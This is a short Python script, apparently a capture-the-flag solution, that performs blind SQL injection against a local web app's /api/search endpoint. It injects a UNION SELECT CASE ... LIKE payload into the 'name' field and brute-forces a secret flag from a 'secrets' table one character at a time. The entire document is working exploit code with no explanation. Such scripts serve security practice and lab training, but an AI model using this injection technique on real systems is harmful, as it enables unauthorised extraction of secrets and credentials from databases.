import requests

url = 'http://localhost:3000/'
known_flag = 'flag{test_flag_example_123456'

while True:
    found = False
    for char_code in range(32, 127):
        char = chr(char_code)
        test_flag = known_flag + char
        payload = f"s1r1us' UNION SELECT CASE WHEN (SELECT secret_value FROM secrets WHERE secret_key = 'flag') LIKE '%{test_flag}%' THEN 's1r1us' ELSE '' END; --"
        data = {'name': payload}

        try:
            response = requests.post(url + 'api/search', json=data)
            response.raise_for_status()
            result = response.json()
            if result['found']:
                known_flag += char
                print(f'Found character: {char}, current flag: {known_flag}')
                found = True
                break
        except requests.exceptions.RequestException as e:
            print(f'Request failed: {e}')
            break
    if not found:
        print(f'No more characters found. Final flag: {known_flag}')
        break